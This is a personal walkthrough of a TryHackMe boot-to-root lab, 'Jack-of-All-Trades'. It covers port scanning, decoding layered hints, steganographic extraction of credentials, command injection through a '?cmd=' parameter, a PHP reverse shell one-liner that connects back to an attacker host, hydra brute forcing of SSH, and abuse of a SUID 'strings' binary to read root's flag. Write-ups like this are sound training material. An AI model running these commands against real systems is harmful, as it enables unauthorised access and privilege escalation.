---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Jack-of-All-Trades
# DESCRIPTION       . Boot-to-root originally designed for Securi-Tay 2020
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/jackofalltrades
```

```
sudo nmap -sSVC -T5 -p- 10.10.63.6 -oN jack
```

```
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.10 (Debian)

80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13b7f0a114e2d32540ff4b9460c5003d (DSA)
|   2048 910cd643d940c388b1be350bbcb99088 (RSA)
|   256 a3fb09fb5080718f931f8d43971edcab (ECDSA)
|_  256 6521e74e7c5ae7bcc6ff68caf1cb75e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- :) Swapped the ports, I see. Firefox (probably other browsers too) denies traffic to known service ports.


> _This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection._


- To allow port 22, open a new tab. In the url, type `config:about`. 

- Search for `network.security.ports.banned.override`. 

	- If it exists, add `,22` (no space before the comma) to the values already existing. 
	- If not, click on the `+` on the right side and create the rule. Add `22` as a value.


#### PORT 22 (yes, not SSH)


- At the end of the message, the user signed up as `Jack`, so we have a potential username.

- Check out the source code

```
!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->			
```

- That string is base64-encoded. Let's decode it.

```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: {REDACTED}
```

- Going to the recovery page, I've got no result by using `jack` as the username with the password found earlier.

- In the source code I found

```
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
```

- Which is base32 encoded. The result is in hex. After decoding from hex, the result is encoded using ROT13, so it needs another decoding before revealing the following message.

```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

The [link](https://en.wikipedia.org/wiki/Stegosauria) is the wikipedia page of a dinosaur. 

- I went down a rabbit hole here. So I was thinking that the username is probably some dinosaur name from that page ... so I've used `cewl` to craft a wordlist.

- Then, I wanted to use hydra with that, but there wasn't any error message desplayed when incorrect credentials were used, so I couldn't use the `http-post-form` feature of Hydra.

- Then, I wanted to do a time-based or event content-length check for each word ending in `*urus` (~91) and the password I had. 

- While I was scripting ... it hit me. The page is called **STEGO**sauria. The **STEGO**saurus image on the main page is called *STEGO.jpg* :|

- Ok, so I've downloaded the `stego.jpg` image and used `stegcrack --extract -sf` on it with the password I had

```
Hehe. Gotcha!

You're on the right path, but wrong image!
```

- Alright. I've tried the same for `header.jpg` and `jackinthebox.jpg` and I was lucky with the first one.

```
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: {REDACTED}
```

- Now, these are NOT the credentials for SSH. They're the credentials for the recovery page.

```
GET me a 'cmd' and I'll run it for you Future-Jack.
```

- So we have the `?cmd=` parameter available to run commands.

- I've used the following reverse shell but encoded as URL

```
php -r '$sock=fsockopen("ip",3131);shell_exec("sh <&3 >&3 2>&3");'
```

- I wanted to check for SUID files after stabilised the shell as `www-data`, but I didn't had permission to use `find` so I took a look in `/home`.

- There I could find a password list for user `jack`. 

- Knowing that, I've used hydra to bruteforce his SSH credentials

```
hydra -l jack -P pl ssh://10.10.63.6 -s 80
```

```
[80][ssh] host: 10.10.63.6   login: jack   password: {REDACTED}>@
```

- The first flag is located in the `/home/jack/user.jpg` image. 

```
scp -P 80 jack@10.10.63.6:/home/jack/user.jpg user.jpg
```

- The second flag is located in `/root/root.txt`. 

- Looking for privilege escalation vectors, I've found out that `strings` binary has the SUID bit set. 

- We can leverage that to read `/root/root.txt` flag directly.


